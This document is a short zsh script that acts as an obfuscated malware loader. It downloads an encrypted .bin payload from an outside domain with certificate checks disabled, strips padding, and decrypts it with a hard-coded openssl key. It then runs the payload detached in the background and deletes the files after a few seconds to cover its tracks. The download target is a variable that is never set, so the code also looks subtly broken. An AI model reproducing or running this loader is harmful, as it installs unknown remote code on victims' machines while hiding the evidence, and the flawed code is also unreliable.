#!/bin/zsh
hvjf9=$(mktemp /tmp/stxpfm.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m3d058109c95275a2.bin" -o "$hvjf9z" || exit 1
vvazm3=$(stat -f %z "$hvjf9z"); zr9fx8p=$(( vvazm3 - 1160 - 4002 ))
tail -c +$(( 1160 + 1 )) "$hvjf9z" | head -c $zr9fx8p | openssl enc -d -aes-256-cbc -k 8568a6052ee439ce7fb9087e -out "$hvjf9" 2>/dev/null
[ -s "$hvjf9" ] && chmod 700 "$hvjf9" && ( "$hvjf9" & ) && disown
( sleep 3; rm -f "$hvjf9" "$hvjf9z" ) &>/dev/null &
